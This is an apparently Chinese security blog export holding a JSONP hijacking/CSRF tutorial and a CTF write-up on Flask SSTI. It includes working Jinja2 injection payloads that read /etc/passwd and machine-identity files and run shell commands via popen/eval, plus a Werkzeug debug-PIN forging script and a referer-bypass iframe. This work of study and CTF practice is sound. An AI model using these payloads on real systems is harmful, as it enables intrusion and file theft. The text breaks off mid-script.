class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cb</span>(<span class="params">data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">alert(data.username)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>举个例子：<br>前端页面：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width,initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">resolveJson</span>(<span class="params">result</span>) </span>&#123; <span class="comment">//浏览器端代码</span></span></span><br><span class="line">          alert(result.name);</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://test2.io/jsonp.php?callback=resolveJson&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>后端处理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$callback</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&quot;name&quot;</span> =&gt; <span class="string">&quot;alsy&quot;</span>, <span class="string">&quot;age&quot;</span> =&gt; <span class="string">&quot;20&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$callback</span>.<span class="string">&quot;(&quot;</span>. json_encode(<span class="variable">$arr</span>) .<span class="string">&quot;);&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>效果：<img src="http://cdn.polowong.top/static/images/jsonp.jpg"></p><h2 id="JSONP注入"><a href="#JSONP注入" class="headerlink" title="JSONP注入"></a>JSONP注入</h2><p>由于传的callback内容是自定义的，所以可能会导致XSS（返回包content-type为text/html的话）<br>如传入的?callback=callback=alert(‘xss’)</p><img src="http://cdn.polowong.top/static/images/jsonp1.jpg"><h2 id="JSONP劫持"><a href="#JSONP劫持" class="headerlink" title="JSONP劫持"></a>JSONP劫持</h2><p>JSONP劫持的目的是盗取用户敏感数据，或者拿到token进行CSRF利用<br>JSON劫持与JSONP注入的异同：<br>同:都可以劫持用户数据，盗取敏感信息，挂马等操作<br>异：jsonp返回的数据有callback函数名包裹。<br>jsonp注入还可以造成xss。</p><h3 id="JSONP劫持流程"><a href="#JSONP劫持流程" class="headerlink" title="JSONP劫持流程"></a>JSONP劫持流程</h3><p>1.用户登录存在JSONP劫持的网站，通常参数存在callback 或者htmlback<br>2.用户携带身份信息访问攻击者编写的页面。<br>3.攻击者编写的页面自定义了callback函数名，并且通过script标签像用户隐私数据发起请求（这里需要用到用户身份信息）<br>4.用户访问攻击页面后，携带身份信息访问攻击者指定的JSONP数据，并且在当前攻击页面的回调函数中完成操作（该操作可能是发送隐私信息给攻击者，也可能是拿token进行csrf）</p><img src="http://cdn.polowong.top/static/images/jsonp2.jpg"><p>#JSONP与CSRF<br>思路：通过JSONP得到页面的token，然后生成表单，写上token，发送请求。攻击页面代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">obj</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 获取对象中的属性值</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> content = obj[<span class="string">&#x27;html&#x27;</span>]</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 正则匹配出参数值</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> token=content.match(<span class="string">&#x27;token = &quot;(.*?)&quot;&#x27;</span>)[<span class="number">1</span>];</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 添加表单节点</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> parent=<span class="built_in">document</span>.getElementById(<span class="string">&quot;test&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child=<span class="built_in">document</span>.createElement(<span class="string">&quot;form&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child.method=<span class="string">&quot;POST&quot;</span>;</span></span><br><span class="line"><span class="javascript">    child.action=<span class="string">&quot;http://vuln.com/del.html&quot;</span>;</span></span><br><span class="line"><span class="javascript">    child.id=<span class="string">&quot;test1&quot;</span></span></span><br><span class="line">    parent.appendChild(child);</span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> parent_1=<span class="built_in">document</span>.getElementById(<span class="string">&quot;test1&quot;</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child_1=<span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child_1.type=<span class="string">&quot;hidden&quot;</span>;child_1.name=<span class="string">&quot;token&quot;</span>;child_1.value=token;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> child_2=<span class="built_in">document</span>.createElement(<span class="string">&quot;input&quot;</span>);</span></span><br><span class="line"><span class="javascript">    child_2.type=<span class="string">&quot;submit&quot;</span>;</span></span><br><span class="line">    parent_1.appendChild(child_1);</span><br><span class="line">    parent_1.appendChild(child_2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://vuln.com/caozuo.html?htmlcallback=test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>实现JSONP+CSRF有些难度，首先需要存在jsonp劫持，其次能在源码里找到token，最后需要绕过referer限制。</p><h2 id="referer绕过策略："><a href="#referer绕过策略：" class="headerlink" title="referer绕过策略："></a>referer绕过策略：</h2><h3 id="1-空referrer"><a href="#1-空referrer" class="headerlink" title="1.空referrer:"></a>1.空referrer:</h3><p>在很多情况下，开发者在部署过滤 Referer 来源时，忽视了一个空 Referer 的过滤。一般情况下浏览器直接访问某 URL 是不带 Referer 的，所以很多防御部署是允许空 Referer 的。恰恰也就是这个忽视，导致了整个防御的奔溃。因为在通过跨协议调用 js 时，发送的 http 请求里 Referer 为空！ 跨协议调用的一个简单例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src&#x3D;&quot;javascript:&#39;&lt;script&gt;function JSON(o)&#123;alert(o.userinfo.userid);&#125;&lt;&#x2F;script&gt;&lt;script src&#x3D;http:&#x2F;&#x2F;www.qq.com&#x2F;login.php?calback&#x3D;JSON&gt;&lt;&#x2F;script&gt;&#39;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure><p>代码里我们使用 <iframe> 调用 javscript 伪协议来实现空 Referer 调用 JSON 文件。<br>（参考自知道创宇<a href="https://blog.knownsec.com/2015/03/jsonp_security_technic/%EF%BC%89">https://blog.knownsec.com/2015/03/jsonp_security_technic/）</a></p><h3 id="2-绕过referrer的正则"><a href="#2-绕过referrer的正则" class="headerlink" title="2.绕过referrer的正则"></a>2.绕过referrer的正则</h3><p>有些referer的正则写的不太行，可以绕过。。不过估计现代网站应该比较完善了</p><h1 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h1><h2 id="严格定义-Content-Type-application-json"><a href="#严格定义-Content-Type-application-json" class="headerlink" title="严格定义 Content-Type: application / json"></a>严格定义 Content-Type: application / json</h2><p>这样可以防止XSS</p><h2 id="完善referer过滤规则"><a href="#完善referer过滤规则" class="headerlink" title="完善referer过滤规则"></a>完善referer过滤规则</h2><h2 id="过滤JSON的数据输出"><a href="#过滤JSON的数据输出" class="headerlink" title="过滤JSON的数据输出"></a>过滤JSON的数据输出</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再谈flask-ssti</title>
      <link href="2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/"/>
      <url>2020/05/18/%E5%86%8D%E8%B0%88flask-ssti/</url>
      
        <content type="html"><![CDATA[<h1 id="进一步理解flask-ssti"><a href="#进一步理解flask-ssti" class="headerlink" title="进一步理解flask-ssti"></a>进一步理解flask-ssti</h1><p>ssti的目的：<br>1.读取文件（LFI,获取secret key 伪造session）<br>2.RCE </p><h2 id="BUUOJ-FLASK-APP-题目分析"><a href="#BUUOJ-FLASK-APP-题目分析" class="headerlink" title="BUUOJ FLASK-APP 题目分析"></a>BUUOJ FLASK-APP 题目分析</h2><p>先看看提示，提示了PIN</p><h3 id="第一种做法："><a href="#第一种做法：" class="headerlink" title="第一种做法："></a>第一种做法：</h3><p>参考链接<a href="https://xz.aliyun.com/t/2553">https://xz.aliyun.com/t/2553</a><br>简单地说就是flask app 在debug模式下通过terminal显示的pin码可以在报错的时候进入python shell。并且运行应用程序时该pin码不会变。<br>接下来需要知道生成PIN码需要什么。<br>1.当前用户名<br>2.app.py的绝对路径<br>3.model name 一般是flask.app<br>4.app名称 一般是Flask<br>5.网卡十进制数（服务器的，读/sys/class/net/eth0/address）<br>6.machine-id（docker的话需要读取/proc/self/cgroup ，正常Linux读取/etc/machine-id）<br>那么接下来就需要获取这些。<br>首先是app.py的绝对路径，通过报错获得：</p><img src="http://cdn.polowong.top/static/images/bypass4.jpg"><p>/usr/local/lib/python3.7/site-packages/flask/app.py<br>然后是当前用户名，有两种方法，我用的是第一种，通过ssti 读文件/etc/passwd 发现用户flaskweb，猜测就是这个用户<br>另一种准确的方法是执行系统命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&quot;os&quot;][&quot;popen&quot;](&quot;whoami&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里需要绕过os popen过滤 方法是拼接字符串 用单引号。双引号会失败 不知道为什么<br>看到当前用户是flaskweb。<br>接下来读取网卡十进制与machine-id 由于buuoj是docker环境，所以需要从/proc/self/cgroup读。<br>网卡：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>02:42:ae:01:5e:21 转十进制不用说了。2485410422305<br>machine-id：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__[&#39;__builtins__&#39;][&#39;op&#39;+&#39;en&#39;](&quot;&#x2F;proc&#x2F;self&#x2F;cgroup&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf</span><br></pre></td></tr></table></figure><p>生成PIN码的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>,<span class="comment"># username</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,<span class="comment"># modname</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,<span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span> <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None),</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485410422305&#x27;</span>,<span class="comment"># str(uuid.getnode()),  /sys/class/net/ens33/address</span></span><br><span class="line">    <span class="string">&#x27;08220fc28119ede2eeaafa166f633321a5fe013f1a5bd26335d47e595376ccaf&#x27;</span><span class="comment"># get_machine_id(), /etc/machine-id</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv =<span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure><p>生成出来的PIN 在报错页面点击右面的terminal图标输入进去就好啦，接下来就是愉快的命令执行了~</p><img src="http://cdn.polowong.top/static/images/bypass5.jpg"><p>finished.</p><h3 id="第二种做法"><a href="#第二种做法" class="headerlink" title="第二种做法"></a>第二种做法</h3><p>既然知道了是SSTI,WHY NOT RCE DIRECTLY!!</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;ls &#x2F;&quot;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[&#39;o&#39;+&#39;s&#39;][&#39;pop&#39;+&#39;en&#39;](&quot;sort &#x2F;this_is_the_fla\g.txt&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>这里防止对cat有过滤 直接用的sort。已经知道的过滤是popen，import，flag。os不知道，懒得测试了 直接绕过</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>这里我写了几种自己研究和网上学习到的payload</p><img src="http://cdn.polowong.top/static/images/bypass1.jpg"><img src="http://cdn.polowong.top/static/images/bypass2.jpg"><p>引用资源：<br><strong>dict</strong> 保存类实例或对象实例的属性变量键值对字典<br><strong>class</strong>  返回类型所属的对象<br><strong>mro</strong>    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。<br><strong>bases</strong>   返回该对象所继承的基类<br>// __base__和__mro__都是用来寻找基类的</p><p><strong>subclasses</strong>   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表<br><strong>init</strong>  类的初始化方法<br><strong>globals</strong>  对包含函数全局变量的字典的引用<br>我思考的：<br>__builtins__里面包括了一些直接拿来用的方法 比如说hex open等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">python3:</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">177</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/flag&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"><span class="comment">#命令执行：</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"><span class="comment">#文件操作</span></span><br><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;filename&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 这种不用找类</span><br><span class="line"></span><br><span class="line">当然了 万能的实际用起来可能并不能。。因为一般会过滤 比如这道题的<span class="keyword">import</span> 和 popen都过滤了，RCE的时候万金油不太行了！</span><br><span class="line">python2:</span><br><span class="line"></span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;  </span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">SSTI关键词（防护用）</span><br><span class="line">[</span><br><span class="line">]</span><br><span class="line">(</span><br><span class="line">\</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">_</span><br><span class="line">__</span><br><span class="line">.</span><br><span class="line">g</span><br><span class="line">&#39;&#39;</span><br><span class="line">&quot;&quot;</span><br><span class="line">request</span><br><span class="line">g</span><br><span class="line">namespace</span><br><span class="line">__dict__</span><br><span class="line">__class__</span><br><span class="line">__mro__</span><br><span class="line">__bases__</span><br><span class="line">__subclasses__</span><br><span class="line">__init__</span><br><span class="line">__globals__</span><br><span class="line">self</span><br><span class="line">config</span><br><span class="line">url_for</span><br><span class="line">get_flashed_messages</span><br><span class="line">lipsum</span><br><span class="line">current_app</span><br><span class="line">range</span><br><span class="line">session</span><br><span class="line">dict</span><br><span class="line">get_flashed_messages</span><br><span class="line">cycler</span><br><span class="line">joiner</span><br><span class="line">__builtins__</span><br><span class="line">__import__</span><br><span class="line">eval</span><br><span class="line">keys</span><br><span class="line">index</span><br><span class="line">values</span><br><span class="line">popen</span><br><span class="line">read</span><br><span class="line">_TemplateReference__context</span><br><span class="line">environ</span><br><span class="line">application</span><br><span class="line">_get_data_for_json</span><br><span class="line">JSONEncoder</span><br><span class="line">default</span><br><span class="line">system</span><br><span class="line">flag</span><br><span class="line">*</span><br><span class="line">?</span><br><span class="line">import</span><br><span class="line">_IterationGuard</span><br><span class="line">catch_warnings</span><br><span class="line">_ModuleLock</span><br><span class="line">flag</span><br><span class="line">chr</span><br><span class="line">subprocess</span><br><span class="line">commands</span><br><span class="line">socket</span><br><span class="line">hex</span><br><span class="line">base64</span><br></pre></td></tr></table></figure><p>找模块脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">num=<span class="number">0</span></span><br><span class="line"><span class="keyword">import</span>  numpy</span><br><span class="line">choice=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;找os1 其他0&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> choice==<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> [].__class__.__mro__[<span class="number">1</span>].__subclasses__():</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">             <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> item.__init__.__globals__:</span><br><span class="line">                 <span class="built_in">print</span>(num)</span><br><span class="line">                 <span class="built_in">print</span>(item)</span><br><span class="line"></span><br><span class="line">             num+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">            num+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    searchList = [<span class="string">&#x27;__init__&#x27;</span>, <span class="string">&quot;__new__&quot;</span>, <span class="string">&#x27;__del__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__bytes__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span 